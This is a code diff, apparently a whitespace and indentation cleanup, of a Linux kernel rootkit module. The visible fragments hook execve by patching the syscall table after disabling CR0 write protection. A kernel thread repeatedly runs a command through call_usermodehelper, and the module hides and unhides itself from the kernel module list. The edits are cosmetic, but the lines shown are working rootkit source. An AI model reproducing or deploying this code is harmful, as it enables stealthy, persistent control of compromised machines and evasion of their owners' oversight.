@@ -30,9 +30,9 @@ asmlinkage int new_execve
 (const char *filename, char *const argv[], char *const envp[])
 {
 #ifdef DEBUG
-   pr_info("%s: hooked call to execve(%s, ...)\n", RK_NAME, filename);
+	pr_info("%s: hooked call to execve(%s, ...)\n", RK_NAME, filename);
 #endif
-   return real_execve(filename, argv, envp);
+	return real_execve(filename, argv, envp);
 }
 
 static int
@@ -40,10 +40,10 @@ rk_thread(void *data)
 {
 	do {
 #ifdef DEBUG
-	pr_info("%s: executing %s\n", RK_NAME, CMD);
+		pr_info("%s: executing %s\n", RK_NAME, CMD);
 #endif
-	call_usermodehelper(CMD, NULL, NULL, UMH_NO_WAIT);
-	msleep(10000);
+		call_usermodehelper(CMD, NULL, NULL, UMH_NO_WAIT);
+		msleep(10000);
 	} while(!kthread_should_stop());
 #ifdef DEBUG
 	pr_info("%s: kernel thread stopping\n", RK_NAME);
@@ -89,7 +89,7 @@ rk_unhide(void)
 	if (!hidden) return;
 	list_add(&THIS_MODULE->list, module_previous);
 	_ = kobject_add(&THIS_MODULE->mkobj.kobj,
-			     THIS_MODULE->mkobj.kobj.parent, "rt");
+			THIS_MODULE->mkobj.kobj.parent, "rt");
 
 	hidden = 0;
 }
@@ -117,8 +117,8 @@ rk_hijack_execve(void)
 		syscall_table[__NR_execve] = &new_execve;
 		write_cr0 (read_cr0 () | 0x10000);
 #ifdef DEBUG
-	pr_info("%s: execve is at %p\n", RK_NAME, real_execve);
-	pr_info("%s: syscall_table[__NR_execve] hooked\n", RK_NAME);
+		pr_info("%s: execve is at %p\n", RK_NAME, real_execve);
+		pr_info("%s: syscall_table[__NR_execve] hooked\n", RK_NAME);
 #endif
 	} else {
 		// TODO: If not debug what?
